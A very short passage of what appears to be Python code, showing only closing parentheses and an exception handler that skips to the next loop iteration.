                    ))
                except Exception:
                    continue
